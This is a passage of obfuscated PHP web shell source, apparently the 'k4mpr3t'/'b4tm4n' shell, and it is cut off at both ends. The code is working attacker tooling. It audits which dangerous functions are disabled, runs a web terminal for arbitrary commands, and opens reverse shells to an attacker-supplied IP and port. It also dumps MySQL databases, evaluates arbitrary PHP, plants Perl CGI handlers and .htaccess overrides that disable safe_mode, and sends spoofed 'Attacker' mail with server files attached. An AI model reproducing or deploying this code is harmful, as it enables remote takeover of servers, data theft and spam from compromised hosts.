Found</font>';}}if(any("x",$_REQUEST)){if($_REQUEST['x']=="logout"){session_destroy();session_regenerate_id();header('location:'.php_self);}if($_REQUEST['x']=="secure"){$f125=array_filter(array_map('trim',explode(',',ini_get("disable_functions"))));$i126=array('_xyec','allow_url_fopen','allow_url_include','apache_child_terminate','apache_get_modules','apache_getenv','apache_note','apache_setenv','base64_decode','chdir','chgrp','chmod','chown','curl_exec','curl_multi_exec','dbase_open','dbmopen','define_syslog_variables','disk_free_space','disk_total_space','diskfreespace','dl','dlopen','escapeshellarg','escapeshellcmd','eval','exec','extract','filepro','filepro_retrieve','filepro_rowcount','fopen_with_path','fp','fput','fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open','get_cfg_var','get_current_user','get_num_redirects','getcwd','getenv','getlastmo','getmygid','getmyinode','getmypid','getmyuid','getrusage','gzinflate','gzuncompress','highlight_file','hpAds_xmlrpcEncode','ini_alter','ini_get_all','ini_restore','ini_set','inject_code','leak','link','listen','mainwork','mb_send_mail','mkdir','mkfifo','move_uploaded_file','mysql_list_dbs','mysql_pconnect','openlog','parse_ini_file','passthru','pcntl_alarm','pcntl_exec','pcntl_fork','pcntl_get_last_error','pcntl_getpriority','pcntl_setpriority','pcntl_signal','pcntl_signal_dispatch','pcntl_sigprocmask','pcntl_sigtimedwait','pcntl_sigwaitinfo','pcntl_strerrorp','pcntl_wait','pcntl_waitpid','pcntl_wexitstatus','pcntl_wifexited','pcntl_wifsignaled','pcntl_wifstopped','pcntl_wstopsig','pcntl_wtermsig','pfsockopen','phpAds_XmlRpc','phpAds_remoteInfo','phpAds_xmlrpcDecode','phpAds_xmlrpcEncode','php_uname','phpinfo','popen','posix_getgrgid','posix_getlogin','posix_getpwuid','posix_kill','posix_mkfifo','posix_setpgid','posix_setsid','posix_setuid','posix_ttyname','posix_uname','posixc','proc_close','proc_get_stats','proc_get_status','proc_nice','proc_open','proc_terminate','ps_aux','putenv','readlink','rename','rmdir','runkit_function_rename','set_time_limit','sh2_exec','shell_exec','show_source','sleep','socket_accept','socket_bind','socket_clear_error','socket_close','socket_connect','socket_create','socket_create_listen','socket_create_pair','socket_get_option','socket_getpeername','socket_getsockname','socket_last_error','socket_listen','socket_read','socket_recv','socket_recvfrom','socket_select','socket_send','socket_sendto','socket_set_block','socket_set_nonblock','socket_set_option','socket_shutdown','socket_strerror','socket_write','str_rot13','stream_select','stream_socket_server','symlink','syslog','system','tp_exec','virtual','xmlrpc_entity_decode');sort($i126);$b127=array_unique(array_merge($f125,$i126));$n128="";$j129=0;$f130=0;$o131=array();$q132=array();$z133=array();$h134=count($b127);foreach($b127 as $v135){$n128.="<tr><td></td><td>$v135</td><td>";if(in_array($v135,$f125)){$n128.="<center><font color=red>DIE</font></center>";$o131[]=$v135;$f130++;}else{if(function_exists($v135)||is_callable($v135)){$n128.="<center><font color=green>READY</font></center>";$q132[]=$v135;$j129++;}else{$n128.="<center><font color=orange>OFF</font></center>";$z133[]=$v135;$f130++;}}$n128.="</td></tr>";}$u136=($j129/$h134)*100;$v137=($f130/$h134)*100;printf("<h2 style='text-align:center'>Sec. Info v2.0.%s</h2><br>
			<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%s%%]</font></h4><br><br>
			<div class='auto-number'>
				<table class='table sortable'>
					<thead>
						<tr>
							<th class='sorttable_nosort' width='15'>No.</th>
							<th>Disable Function</th>
							<th>Status</th>
						</tr>
					</thead>
					<tbody>
						%s
					</tbody>
				</table>
				<fieldset style='margin-bottom:15px'>
					<legend>Ready List</legend>
					<textarea>%s</textarea>
				</fieldset>
				<div class='divide'>
					<div class='divide-left'>
						<fieldset style='margin-bottom:15px'>
							<legend>Off List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
					<div class='divide-right'>
						<fieldset>
							<legend>Die List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
			</div>",$h134,round($u136,2),round($v137,2),$n128,implode($q132,', '),implode($z133,', '),implode($o131,', '));}if($_REQUEST['x']=="info"){printf("<div id='php-configuration'>
			<form onsubmit='return false;' class='new'>
				<select id='php-config'>
					<option value='4'>INFO_CONFIGURATION</option>
					<option value='16' selected>INFO_ENVIRONMENT</option>
					<option value='32'>INFO_VARIABLES</option>
					<option value='8'>INFO_MODULES</option>
					<option value='1'>INFO_GENERAL</option>
					<option value='2'>INFO_CREDITS</option>
					<option value='64'>INFO_LICENSE</option>
					<option value='-1'>INFO_ALL</option>
				</select>
				<input type='submit' onclick=\"return getAjax(true,'php-info','POST','?x=info&xa=envirolment&config='+document.getElementById('php-config').value);\"/><br>
			</form>
		</div>
		<div id='php-info' class='result'></div>");$w138=array('PHP_VERSION','PHP_MAJOR_VERSION','PHP_MINOR_VERSION','PHP_RELEASE_VERSION','PHP_VERSION_ID','PHP_EXTRA_VERSION','PHP_ZTS','PHP_DEBUG','PHP_MAXPATHLEN','PHP_OS','PHP_OS_FAMILY','PHP_SAPI','PHP_EOL','PHP_INT_MAX','PHP_INT_MIN','PHP_INT_SIZE','PHP_FLOAT_DIG','PHP_FLOAT_EPSILON','PHP_FLOAT_MIN','PHP_FLOAT_MAX','DEFAULT_INCLUDE_PATH','PEAR_INSTALL_DIR','PEAR_EXTENSION_DIR','PHP_EXTENSION_DIR','PHP_PREFIX','PHP_BINDIR','PHP_BINARY','PHP_MANDIR','PHP_LIBDIR','PHP_DATADIR','PHP_SYSCONFDIR','PHP_LOCALSTATEDIR','PHP_CONFIG_FILE_PATH','PHP_CONFIG_FILE_SCAN_DIR','PHP_SHLIB_SUFFIX','PHP_FD_SETSIZE');$n128="";foreach($w138 as $u139){$n128.="<tr><td>".$u139."</td><td>".@constant($u139)."</td></tr>";}printf("<h2>Core Predefined Constants</h2><br>
				<table class='table'>
					<thead>
						<tr>
							<th>Predefined Constants</th>
							<th>Value</th>
						</tr>
					<tbody>%s</tbody>
				</table>",$n128);if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="envirolment"){ob_clean();phpinfo($_REQUEST['config']);$s140=ob_get_contents();ob_end_clean();$s140=preg_replace('%^.*<body>(.*)</body>.*$%ms','$1',$s140);printf("<div id='phpinfo'>%s</div>",$s140);exit;}}if($_REQUEST['x']=="db"){$w141=any("connect",$_SESSION)?$_SESSION['connect']:"";$g109=any("status",$_SESSION)?$_SESSION['status']:"";$o142=any("query",$_REQUEST)?$_REQUEST['query']:"show databases;";if($w141==true){$a143="";$h144=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);printf("<div class='database-session'>
						<div class='database-query'>
							<form action='?x=db&xa=qry' method='post'>
								<label>MYSQL Query<hr></label><br>
								<label><i style='color:#222'>
								show databases;<br>
								show tables from {database};<br>
								show columns from {database}.{table};<br>
								select count(*) from {database}.{table};<br>
								select * from {database}.{table}limit 0,10;</i></label>
								<textarea id='query' name='query'>%s</textarea><br>
								<input type='submit' name='disconnect' value='Disconnect'/>
								<input type='submit' value='Execute'/>
							</form>
						</div>
						<div class='database-process'>
							<!-- div class='mysql-process-result'>
								<label>Database Process <a href='?x=db&xa=proc'>&#9851;</a><hr></label>
								<table class='table table-bordered'>
									<thead>
										<tr>
											<th>Id</th>
											<th>Host</th>
											<th>Database</th>
											<th>Command</th>
											<th>Time</th>
										</tr>
									</thead>
									<tbody>%s</tbody>
								</table>
							</div -->
							<div class='database-dump'>
								<label>Database Dump<hr></label>
								<form action='?x=db&xa=dmp' method='post'><br>
									<label>Database</label><input type='text' name='database' value=''/><br>
									<label>Output</label><input type='text' name='output' value='%s'/><br>
									<input type='submit' value='Dump' />
									<label>%s</label>
								</form>
							</div>
						</div>
						<div class='clr'></div>
					</div>
					",$o142,$a143,$f36,$g109);}else{printf("<div id='database'>
					<form action='?x=db&xa=db' method='post' class='new'><br>
						<label>Host</label><input type='text' name='host' value='localhost'/><br>
						<label>Port</label><input type='text' name='port' value='3306'/><br>
						<label>Username</label><input type='text' name='user' value='root'/><br>
						<label>Password</label><input type='text' name='pass' value=''/><br>
						<label>Database</label><input type='text' name='dbas' value=''/><br>
						<input type='submit' value='Connect'/>
					</form>
				</div>");}if(any("rs",$_REQUEST)){$_SESSION[$_REQUEST['rs']]='';}if(any("cd",$_REQUEST)){$_SESSION['qdb']=$_REQUEST['cd'];}if(any("ct",$_REQUEST)){$_SESSION['qtb']=$_REQUEST['ct'];}if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db"){$k145=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['dbas'],$_REQUEST['port']);$_SESSION['host']=$_REQUEST['host'];$_SESSION['port']=$_REQUEST['port'];$_SESSION['user']=$_REQUEST['user'];$_SESSION['pass']=$_REQUEST['pass'];$_SESSION['dbas']=$_REQUEST['dbas'];if($k145){$_SESSION['connect']=true;header('location:'.php_self.'?x=db');}else{$_SESSION['connect']=false;printf("<b class='off'>Connection Failed</b>");}}if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="qry"){$_SESSION['status']='';$w146=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);if(isset($_REQUEST['disconnect'])){mysqli_close($w146);unset($_SESSION['connect']);unset($_SESSION['query']);unset($_SESSION['host']);unset($_SESSION['user']);unset($_SESSION['pass']);unset($_SESSION['dbas']);unset($_SESSION['qdb']);unset($_SESSION['qtb']);header('location:'.php_self.'?x=db');}$h144=!empty($_REQUEST['query'])?$_REQUEST['query']:"show databases;";$c43=mysqli_query($w146,$h144);$b147=array();$t148=array();if($c43){while($j149=mysqli_fetch_field($c43)){$t148[]=$j149->$j150;}$b147[]=$t148;while($b151=mysqli_fetch_row($c43)){$b147[]=$b151;}mysqli_free_result($c43);}else{$b147=false;}if($b147!==false){$b152=isset($_SESSION['qdb'])?$_SESSION['qdb']:'';$r153=isset($_SESSION['qtb'])?$_SESSION['qtb']:'';$o154="<a href='?x=db&xa=qry&rs=qdb&query=show databases;'>Database</a>";$h155=!empty($_SESSION['qdb'])?"&#8594;	<a href='?x=db&xa=qry&rs=qtb&query=show tables from $b152;'>$b152</a>":"";$j156=!empty($_SESSION['qtb'])?"&#8594;	<a href='?x=db&xa=qry&query=show columns from $b152.$r153;'>$r153</a>":"";printf("<div class='database=table'>
						<div class='database-breadcrumb'>%s %s %s</div>
						<div class='auto-number'>
						<table class='table sortable'>",$o154,$h155,$j156);foreach($b147 as $z85=>$q86){if(is_array($q86)){if($z85==0){print"<tr><th class='sorttable_nosort'>&#9776;</th>";foreach($q86 as $r157=>$a158){if(!is_array($a158)){print"<th>".$a158."</th>";}}print"</tr>";}else{print"<tr><td width='15'></td>";foreach($q86 as $z159=>$x160){if(!is_array($x160)){if(strpos($a158,'Database')!==false){print"<td><a href='?x=db&xa=qry&cd=$x160&query=show tables from $x160;'>$x160</a></td>";}elseif(strpos($a158,'Tables')!==false){$i161=substr($a158,strpos($a158,'Tables_in_')+10);print"<td><a href='?x=db&xa=qry&cd=$i161&ct=$x160&query=select * from $i161.$x160 limit 0,10;'>$x160</a></td>";}else{print"<td>$x160</td>";}}}print"</tr>";}}}print"</table></div></div>";}else{print'<span class=off>Query not Executed</span>';}}if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="dmp"){$f162=$_REQUEST['database'];$h163=$_REQUEST['output'];if(!file_exists($h163)&&!empty($f162)){$p164=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);mysqli_set_charset($p164,'utf8');mysqli_select_db($p164,$f162);$a165=array();$c43=mysqli_query($p164,'SHOW TABLES');while($b151=mysqli_fetch_row($c43)){$a165[]=$b151[0];}$p166='SET FOREIGN_KEY_CHECKS=0;'."\r\n";$p166.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'."\r\n";$p166.='SET AUTOCOMMIT=0;'."\r\n";$p166.='START TRANSACTION;'."\r\n";foreach($a165 as $n128){$c43=mysqli_query($p164,'SELECT * FROM '.$n128);$n167=mysqli_num_fields($c43);$o168=mysqli_num_rows($c43);$r169=0;$x170=mysqli_fetch_row(mysqli_query($p164,'SHOW CREATE TABLE '.$n128));$p166.="\n\n".$x170[1].";\n\n";if($o168!==0){$g171=@mysqli_fetch_fields($c43);$p166.='INSERT INTO '.$n128.'( ';foreach($g171 as $a172){$p166.='`'.$a172->$j150.'`,';}$p166=substr($p166,0,-2);$p166.=' ) VALUES';for($m75=0;$m75<$n167;$m75++){while($b151=mysqli_fetch_row($c43)){$p166.="\n(";for($b78=0;$b78<$n167;$b78++){$b151[$b78]=addslashes($b151[$b78]);$b151[$b78]=preg_replace("#\n#","\\n",$b151[$b78]);if(isset($b151[$b78])){$p166.='"'.$b151[$b78].'"';}else{$p166.='""';}if($b78<($n167-1)){$p166.=',';}}if(++$r169==$o168){$p166.=");";}else{$p166.="),";}}}}$p166.="\n\n\n";}$p166.='SET FOREIGN_KEY_CHECKS=1;'."\r\n";$p166.='COMMIT;';$h163=pathinfo($t173)['extension']=='sql'?$h163:$h163.'.sql';$b63=fopen($h163,'w+');fwrite($b63,$p166);fclose($b63);$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($h163),basename($h163));}else{$_SESSION['status']="<span class=off>Dump Error</span>";}header('location:'.php_self.'?x=db');}}if($_REQUEST['x']=="terminal"){printf("
			<div id='terminal'>
				<textarea id='prompt-terminal' class='cmd' cols='122' rows='20' readonly>%s</textarea>
				<form onsubmit='return false;'>
					<label id='curdir-terminal'>$ %s:</label>
					<input type='text' id='terminal-input' autocomplete='off' onfocus=\"\" onkeydown=\"
						if(event.keyCode==13) 
						{
							temp=this.value;
							this.value='';
							getAjax(true,'curdir-terminal','POST','?x=terminal&xa=terminals-curdir&cmd='+temp);
							return getAjax(false,'prompt-terminal','POST','?x=terminal&xa=terminals&cmd='+temp);
						}
					\" class='cmd' name=cmd cols=122 rows=2></input>
				</form>
			</div>",Execute('whoami'),$f36);if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals"){ob_clean();$k174=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";@chdir($f36);$v175='UTF-8';if(!Unix()){$v175='Windows-1251';}$n176=iconv($v175,'UTF-8',Execute($k174));print$n176;exit;}elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir"){ob_clean();$k174=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";if(preg_match('/cd (.*)/',$k174,$x177)){if($x177[1]=='..'){$f36=substr($f36,0,strrpos($f36,_));if(strlen($f36)<=2)$f36=$f36._;}else{if(is_dir($x177[1])){$f36=realpath($x177[1]);}}}$_SESSION['c']=urle($f36);print'$ '.$f36.':';exit;}}if($_REQUEST['x']=="connect"){printf("<div id='connect'>
				<div class='connect-left'>
					<div class='Reverse-connect'>
						<fieldset>
							<legend>Reverse Connect</legend>
							<form action='?x=connect&xa=reverse-connect' method='post' onsubmit=\"
								return confirm('HOST will FUCKED ON ur PC or LAPTOP ?!\\nMake Sure ur FIREWALL OFF ?!\\nUSE NETCAT {nc -lvp ' + document.getElementById('reverse-port').value+'}\\n\\nTYPE \'exit\' or \'quit\' to TERMINATE')\">
								<label>Remote Ip</label><input type='text' name='reverse-ip' value='%s'/><br>
								<label>Remote Port</label><input type='text' id='reverse-port' name='reverse-port' value='1337'/><br>
								<label>Socket</label><select name='socket'>
									<option value='fsockopen'>fsockopen</option>
									<option value='socket_create'>socket_create</option>
									<option value='stream_socket_client'>stream_socket_client</option>
								</select><br>
								<input type='submit' value='Connect'  />
							</form>
						</fieldset>
					</div>
				</div>
				<div class='connect-right'>
					<div class='status-connect'>
						<fieldset>
 							<legend>Status</legend>
							<div id='connect-result'>Terminal: %s",remote_addr,Execute('whoami'));if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="reverse-connect"){if($_REQUEST['socket']=="fsockopen"){$b178=$_REQUEST['reverse-ip'];$e179=$_REQUEST['reverse-port'];$l180=@fsockopen($b178,$e179,$w23,$y24);if($w23!=0){printf("<font color='red'><b>%s</b>:%s</font>",$w23,$y24);}else{while(!feof($l180)){fwrite($l180,"[b4tm4n]:");$k174=fgets($l180,1024);if(trim($k174)=='quit'||trim($k174)=='exit'){fclose($l180);printf($k174);exit;}fwrite($l180,Execute($k174));}fclose($l180);}}else if($_REQUEST['socket']=="socket_create"){$b178=$_REQUEST['reverse-ip'];$e179=$_REQUEST['reverse-port'];$l180=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_set_nonblock($l180);if(!$l180){printf("<font color='red'>Connection Error</font>");}else{while(!@socket_connect($l180,$b178,$e179)){@socket_write($l180,"[b4tm4n]:",strlen("[b4tm4n]:"));$m181=@socket_read($l180,1024,PHP_NORMAL_READ);if(trim($m181)=='quit'||trim($m181)=='exit'){socket_set_block($l180);socket_close($l180);printf($m181);exit;}@socket_write($l180,Execute($m181),strlen(Execute($m181)));}socket_set_block($l180);socket_close($l180);}}else if($_REQUEST['socket']=="stream_socket_client"){$b178=$_REQUEST['reverse-ip'];$e179=$_REQUEST['reverse-port'];$l180=@stream_socket_client("tcp://$b178:$e179",$w23,$y24);if(!$l180){printf("<font color='red'><b>%s</b>:%s</font>",$w23,$y24);}else{while(!feof($l180)){fwrite($l180,"[b4tm4n]:");$k174=fgets($l180,1024);if(trim($k174)=='quit'||trim($k174)=='exit'){fclose($l180);printf($k174);exit;}fwrite($l180,Execute($k174));}fclose($l180);}}}printf("</fieldset></div></div></div></div>");}if($_REQUEST['x']=="htaccess"){$b182=array("php_value upload_max_filesize 32M","php_value post_max_size 32M","php_flag safe_mode Off","php_value disable_functions null","php_flag safe_mode_gid Off","php_value open_basedir $f36","php_flag register_globals On","php_flag exec On","php_flag shell_exec On");$o183=array("Options All","Allow From All","Satisfy Any");printf("
			<div class='divide'>
				<div class='divide-left'>
					<textarea>%s</textarea>
				</div>
				<div class='divide-right'>
					<textarea>%s</textarea>
				</div>
			</div>",implode($b182,"\n"),implode($o183,"\n"));}if($_REQUEST['x']=="php"){$t67=array("print_r(get_extension_funcs('Core'));","print_r(get_loaded_extensions());","print_r(ini_get_all('pcre'));","print_r(ini_get_all());","print_r(get_defined_constants());","print_r(get_defined_functions());","print_r(get_declared_classes());");printf("<div id='php'>
					<form onsubmit='return false;'>
						<div class='php-left'>
							<textarea id='php-code' cols='122' rows='20'>%s</textarea>
						</div>
						<div class='php-right'>
							<textarea id='php-eval' cols='122' rows='20' readonly></textarea>
						</div>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&codex='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Inject'/>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Run'/>
					</form>
				</div>",implode($t67,"\n"));if(any("code",$_REQUEST)){ob_clean();$v121=trim($_REQUEST['code']);$w38=Evil($v121);exit;}if(any("codex",$_REQUEST)){ob_clean();$v121=trim($_REQUEST['codex']);$w38=Evil($v121,true);exit;}}if($_REQUEST['x']=="perl"){print'PHP Perl Class: '.(class_exists('Perl')?"<b class='on'>ON</b>":"<b class='off'>OFF</b>").'<br>';if(Unix()){if(file_exists("/usr/bin/perl")){$p184="/usr/bin/perl";}else{$p184="/usr/bin/env perl";}}else{if(file_exists("C:\\perl\bin\perl.exe")){$p184="C:\\perl\bin\perl.exe";}elseif(file_exists("C:\\wamp\bin\perl.exe")){$p184="C:\\wamp\bin\perl.exe";}elseif(file_exists("C:\\xampp\perl\bin\perl.exe")){$p184="C:\\xampp\perl\bin\perl.exe";}}$w185=array("#!$p184","use strict;","use warnings;","use CGI;","print CGI::header();","print 'k4mpr3t on CGI';");$o183=array("Options +ExecCGI +SymLinksIfOwnerMatch","DirectoryIndex index.ler","AddType application/x-httpd-cgi .ler","AddHandler cgi-script .ler");$d56=$f36._.'cgi-bin';$r29=$d56._.'perl.ler';$c186=$d56._.'.htaccess';$u187=implode($w185,"\n");$r188=implode($o183,"\n");if(!is_dir($d56)){mkdir($d56,0755);}if(!is_file($r29)){$u31=fopen($r29,'w+');fwrite($u31,$u187);fclose($u31);chmod($r29,0755);}if(!is_file($c186)){$u31=fopen($c186,'w+');fwrite($u31,$r188);fclose($u31);chmod($c186,0755);}$f189=GetUrlFromPath($r29);printf("Tested -> <a href='$f189' target='_blank'><u>Link</u></a>");if(class_exists('Perl')){$s190=new Perl();$s190->eval("print \"Executing Perl code in PHP\n\"");print"Hello from PHP! ";$s190->require($r29);$q86=$s190->somePhpFunc('test');print$q86;}}if($_REQUEST['x']=="mail"){printf("

			<div class='divide'>
				<div class='divide-left'>
					<fieldset>
						<legend>Mail</legend>
						<form onsubmit='return false;' class='mail'>
							<label>From</label><input type='text' id='email-from' placeholder='Attacker <very@handsome.com>' value='Attacker <very@handsome.com>'/><br>
							<label>Reply To</label><input type='text' id='email-reply' placeholder=very@handsome.com' value='very@handsome.com'/><br>
							<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' value=''/><br>
							<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>
							<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>
							<label>Subject</label><input type='text' id='email-subject' placeholder='What You Waiting For ?' value=''/><br>
							<label>Attachment (FIlename)</label><input type='text' id='email-attachment' placeholder='%s' value=''/><br>
							<label>Messages</label><input type='text' id='email-message'/><br>
							<input type='submit' value='Send' onclick=\"

								getAjax(true,
									'send-result',
									'POST',
									'?x=mail&xa=send'+
									'&from='+document.getElementById('email-from').value+
									'&reply='+document.getElementById('email-reply').value+
									'&to='+document.getElementById('email-to').value+
									'&cc='+document.getElementById('email-cc').value+
									'&bcc='+document.getElementById('email-bcc').value+
									'&subject='+document.getElementById('email-subject').value+
									'&message='+document.getElementById('email-message').value+
									'&attachment='+document.getElementById('email-attachment').value);

							\"/>	
						</form>
					</fieldset>
				</div>
				<div class='divide-right'>
					<fieldset>
						<legend>Result's</legend>
						<div id='send-result'></div>
					</fieldset>
				</div>
			</div>

		",php_self);if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='send'){ob_clean();$m191=$_REQUEST['from'];$b192=$_REQUEST['reply'];$l193=$_REQUEST['to'];$l194=$_REQUEST['cc'];$n195=$_REQUEST['bcc'];$s196=$_REQUEST['subject'];$w197=$_REQUEST['message'];$x198=$_REQUEST['attachment'];$z68=md5(uniqid(time()));$m199[]="From: $m191";$m199[]="Reply-To: $b192";$m199[]="To: $l193";if(!empty($l194))$m199[]='Cc: $cc';if(!empty($n195))$m199[]='Bcc: $bcc';$m199[]="MIME-Version: 1.0";$m199[]="Content-Type: multipart/mixed; boundary=\"$z68\"";$w200[]="--$z68";$w200[]="Content-type: text/html; charset=\"iso-8859-1\"";$w200[]="Content-Transfer-Encoding: 8bit";$w200[]="";$w200[]="$w197";$w200[]="";if(is_file($x198)){$s58=file_get_contents($x198);$s58=chunk_split(B64E($s58));$t148=basename($x198);$a105=mime_content_type($x198);$w200[]="--$z68";$w200[]="Content-Type: $a105; name=\"$t148\"";$w200[]="Content-Transfer-Encoding: base64";$w200[]="Content-Disposition: attachment";$w200[]="";$w200[]="$s58";$w200[]="";$w200[]="--$z68--";}$p201=implode("\r\n",$w200);$e61=implode("\r\n",$m199);if(mail($l193,$s196,$p201,$e61)){print"Email Send";}else{$s202=error_get_last();print"Error :".$s202['message'];}exit;}}if($_REQUEST['x']=='process'){printf("<div id='process-kill'><form class='new' method='post' action='?x=process&xa=kill'>
					<label>PID</label> <input type='text' name='pid'/>
					<input type='submit' value='Kill'/><br>
					<label>Name</label> <input type='text' name='name'/>
					<input type='submit' value='Kill'/>
				</form></div>");if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="kill"){$p203=$_REQUEST['pid'];$t148=$_REQUEST['name'];if(Unix()){$o204=Execute("kill 9 $p203");$o204=Execute("kill 9 $t148");if($o204)print'<font class="off">Process Killed</font>';}else{$o204=Execute("taskkill /f /pid $p203");$o204=Execute("taskkill /f /im $t148");if($o204)print'<font class="off">Process Killed</font>';}}if(Unix()){$n176=iconv('UTF-8','UTF-8',Execute('ps aux'));print'<div id="process-list"><pre>'.$n176.'</pre></div>';}else{$n176=iconv('Windows-1251','UTF-8',Execute('tasklist'));print'<div id="process-list"><pre>'.$n176.'</pre></div>';}}if($_REQUEST['x']=='shells'){print"Coming Soon";}if($_REQUEST['x']=='symlink'){print"Coming Soon";}if($_REQUEST['x']=="account"){printf("<div id='account'><form class='new' method='post' action='?x=account&xa=change'>
					<label>Username</label> <input type='text' name='change-username' autocomplete='off' value='%s'/> <br>
					<label>Password</label> <input type='text' name='change-password' autocomplete='off'value=''/><br>
					<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
				</form></div>",B64D($s2[0]));if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="change"){$t205=script_filename;$y206=$_REQUEST['change-password'];$k207=$_REQUEST['change-username'];if(!empty($y206)&&!empty($k207)){$h208=$s2[0];$m209=B64E($k207);$s58=file_get_contents($t205);$x210=explode($h208,$s58);$s58=implode($m209,$x210);$i211=file_put_contents($t205,$s58);$w212=$s2[1];$r213=sha1(md5($y206));$s58=file_get_contents($t205);$x210=explode($w212,$s58);$s58=implode($r213,$x210);$i211=file_put_contents($t205,$s58);if($i211){session_destroy();session_regenerate_id();header('location:'.php_self);}else{printf("Error change account");}}else{printf("<b class='off'>Mistakes !</b>");}}}if($_REQUEST['x']=="action"){$c214=any('chk',$_REQUEST)?$_REQUEST['chk']:array();$j215=any('action-value',$_REQUEST)?$_REQUEST['action-value']:$_REQUEST['action-option'];$v216="";$b151="";$s97=0;$p98=0;foreach($c214 as $r29){if(is_dir(urld($r29))){$s97++;}if(is_file(urld($r29))){$p98++;}$b151.="<tr><td>".urld($r29)."</td></tr>";$v216.=urld($r29).",";}if(count($c214)==1&&$j215=='copy'){header('location:'.php_self.'?a=cp&r='.$c214[0]);}if(count($c214)==1&&$j215=='move'){header('location:'.php_self.'?a=mv&r='.$c214[0]);}if(!any('xa',$_REQUEST)&&$j215=='delete'){printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<input type='hidden' name='action-option' value='%s'/>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='submit' value='Remove'/>
					</form>",$s97,$p98,$b151,$j215,$v216);}if(!any('xa',$_REQUEST)&&$j215!='delete'){printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<script>window.onload=function(e){document.getElementById('action_option').value='%s'}</script>
						<select name='action-option' id='action_option'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<i>-></i>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='text' name='newloc' value='%s'/>
						<input type='submit' value='Process'/>
					</form>",$s97,$p98,$b151,$j215,$v216,$f36._);}if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='option'){$c214=array_filter(explode(',',$_REQUEST['tmp']));$d217=trim(@$_REQUEST['newloc']);$t218=0;$m219=0;if($_REQUEST['action-option']=='copy'){if(file_exists($d217)&&is_dir($d217)){foreach($c214 as $r29){if(CopyRecursive($r29,rtrim($d217,_)._.basename($r29))){$t218++;}else{$m219++;}}print"Success: $t218 | Failed: $m219";}else{print"Target not exists !";}}if($_REQUEST['action-option']=='move'){if(file_exists($d217)&&is_dir($d217)){foreach($c214 as $r29){if(MoveRecursive($r29,rtrim($d217,_)._.basename($r29))){$t218++;}else{$m219++;}}print"Success: $t218 | Failed: $m219";}else{print"Target not exists !";}}if($_REQUEST['action-option']=='delete'){foreach($c214 as $r29){if(Remove($r29)){$t218++;}else{$m219++;}}print"Success: $t218 | Failed: $m219";}if($_REQUEST['action-option']=='zip'){if(pathinfo($d217)['extension']=='zip'){$c220=new ZipArchive;if($c220->open($d217,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE){foreach($c214 as $r29){if(is_dir($r29)){$c220->addEmptyDir(basename($r29));$c221=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($r29),RecursiveIteratorIterator::LEAVES_ONLY);foreach($c221 as $z85=>$q86){if(basename($z85)!=".."){if(is_dir($z85)){$q222=str_replace($r29,basename($r29),realpath($z85));$c220->addEmptyDir($q222);}elseif(is_file($z85)){$r223=str_replace($r29,basename($r29),realpath($z85));$c220->addFile(realpath($z85),$r223);}}}}elseif(is_file($r29)){$c220->addFile($r29,basename($r29));}}$c220->close();print'Zip Created';}else{print'Failed';}}else{print'Extension must Zip';}}if($_REQUEST['action-option']=='unzip'){if(file_exists($d217)&&is_dir($d217)){foreach($c214 as $r29){if(pathinfo($d217)['extension']=='zip'){$c220=new ZipArchive;if($c220->open($r29)===TRUE){$c220->extractTo($d217);$c220->close();$t218++;}else{$m219++;}}else{$m219++;}}print"Success: $t218 | Failed: $m219";}else{print"Target not exists !";}}}}if($_REQUEST['x']=="find"){$c221=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f36),RecursiveIteratorIterator::LEAVES_ONLY);if(any('find-value',$_REQUEST)&&!empty($_REQUEST['find-value'])){$c43="";$h224=0;foreach($c221 as 